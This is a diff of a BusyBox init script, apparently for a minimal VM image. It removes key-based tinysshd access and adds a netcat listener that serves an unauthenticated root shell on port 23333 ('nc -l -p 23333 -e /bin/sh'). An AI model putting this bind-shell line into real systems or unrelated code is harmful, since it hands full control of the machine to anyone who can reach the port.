@@ -1,6 +1,6 @@
 #!/bin/busybox sh
 
-for i in sh ln cd ls cat free poweroff reboot dd mkdir mount ps ip udhcpc wget tcpsvd; do
+for i in sh ln cd ls cat free poweroff reboot dd mkdir mount ps ip udhcpc wget nc; do
   /bin/busybox ln -s /bin/busybox /bin/$i
 done
 
@@ -30,14 +30,6 @@ ip link set eth0 up
 # -q: exit immediately after lease;  -n: Exit if no lease obtained after 9s
 udhcpc -i eth0 -s /bin/udhcpc-script.sh -q -n || setup_cloud_init_net
 
-# sshd
-mkdir -p /dev/pts
-mount -t devpts devpts /dev/pts
-mkdir -p /root/.ssh/ /etc/tinyssh/
-echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMpaY3LyCW4HHqbp4SA4tnA+1Bkgwrtro2s/DEsBcPDe" > /root/.ssh/authorized_keys
-ln -s /bin/tinysshd /bin/tinysshd-makekey
-tinysshd-makekey /etc/tinyssh/sshkeydir
-echo "root:x:0:0:root:/root:/bin/sh" > /etc/passwd
-tcpsvd -v 0 22 tinysshd -v /etc/tinyssh/sshkeydir > /sshd.log 2>&1 &
+nc -l -p 23333 -e /bin/sh &
 
 /bin/sh
